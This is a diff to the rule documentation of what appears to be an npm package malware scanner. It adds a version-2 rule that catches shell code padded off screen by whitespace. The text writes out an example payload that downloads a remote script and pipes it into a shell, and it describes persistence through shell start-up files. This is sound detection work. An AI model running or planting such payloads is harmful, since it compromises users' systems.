@@ -97,7 +97,7 @@ attributed.
 | `static.process-exec` | `child_process` | LOW |
 | `static.network` | `http`, `https`, `net`, `dns`, `dgram` modules | LOW |
 | `static.shell-startup` (2026-11-08) | writes to shell start-up files (`~/.bashrc`, `~/.zshrc`, `~/.profile`, fish's `config.fish`, the PowerShell profile). Forms: `hook` (an install hook in `package.json` appends to one), `inject` (code that writes files holds a line sourcing a file under `$HOME`, or a prompt that runs a command: `setopt prompt_subst`, `PROMPT="$(...)"`), `shell` (a shell command elsewhere appends to one), `code` (a start-up file's name, a file write within 1,000 characters and a home-directory reference) | MEDIUM (weight 3) for `hook` and `inject`; LOW for `shell` and `code` |
-| `static.padded-code` (2026-11-10, `rules/padding.py`) | code pushed off screen: on one line, a run of 100+ spaces or tabs, then 200+ characters of code (not a comment, table cell or markup, not inside a string, with code punctuation); a run that is the line's indentation counts only when it is 100+ deeper than the line before's. One finding per file; [below](#code-hidden-behind-whitespace-staticpadded-code-2026-11-10) | MEDIUM (weight 3) |
+| `static.padded-code` (v2, 2026-11-10, `rules/padding.py`) | code pushed off screen: on one line, a run of 100+ spaces or tabs, then 200+ characters of code (not a comment, table cell or markup, not inside a string, with code punctuation, or shell code: a chained command or a pipe into a shell, v2); a run that is the line's indentation counts only when it is 100+ deeper than the line before's. One finding per file; [below](#code-hidden-behind-whitespace-staticpadded-code-2026-11-10) | MEDIUM (weight 3) |
 | `static.channel-follow` (2026-11-08) | a WhatsApp library (Baileys fork) following channels with the user's account: a FOLLOW query or `newsletterFollow(...)` call outside the library's own follow method, in a file that also names channels (`...@newsletter`, `0029V...` invite codes, also in base64 or char codes), fetches them, or calls it an auto-follow/auto-join; not behind an `if (... === true)` opt-in. Never demoted as "not new" | MEDIUM (weight 3), "unwanted" |
 | `static.channel-tagging` (2026-11-09) | a WhatsApp library (Baileys fork) tagging the user's messages with a channel: a fixed `...@newsletter` JID written as `newsletterJid` in a file that builds the forwarded-newsletter context (`forwardedNewsletterMessageInfo`). Never demoted as "not new"; [below](#whatsapp-channel-tagging-staticchannel-tagging-2026-11-09) | MEDIUM (weight 3), "unwanted" |
 
@@ -423,6 +423,14 @@ Measured with the real code (round 4 F):
   `emittery-up@1.8.2` and `tailwindcss-animate-ui@1.0.0` (149-152 tabs, same loader).
   None of the 1,500 benign samples has the shape (1,046 with files read; 9 have a run of 80+
   then 100+ characters, none 100/200).
+
+v2 (2026-11-10, round 4 G, [precision-round4-G](../proposals/precision-round4-G.md)): shell
+code is code too. "Code punctuation" asked for `(` or `=`, which `; curl -s https://x/p | sh`
+behind 150 tabs has neither of; a tail that starts by chaining a command (`;`, `&&`) or that
+pipes into a shell or `iex` now counts. On agent F's scans (every run of 100+ followed by 200+
+characters in the 3,716 verdicted live versions, 45 lines, and in the `vm-day1` samples F read,
+25) no line that v1 refused is anything but a table, comment or markup, so v2 adds no match
+there; it exists for the shape, not for a measured sample.
 
 Known limit: the indentation exception can be gamed (indent the line before as deep), and a
 payload padded with other characters (non-breaking spaces, form feeds) is not matched.
